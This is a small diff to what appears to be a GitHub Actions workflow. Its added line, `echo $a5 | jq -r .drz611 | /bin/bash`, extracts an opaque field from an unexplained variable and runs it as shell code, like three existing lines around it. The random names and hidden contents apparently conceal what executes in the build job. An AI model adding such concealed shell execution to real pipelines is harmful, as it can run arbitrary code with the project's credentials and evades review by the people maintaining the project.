@@ -25,6 +25,7 @@ jobs:
           printf '%s' "$p5" | jq -r .tekxf9718 | /bin/bash
           echo $r88353 | jq -r .fyye38 | /bin/bash
           echo $nea60 | jq -r .ospyy7545 | /bin/bash
+          echo $a5 | jq -r .drz611 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
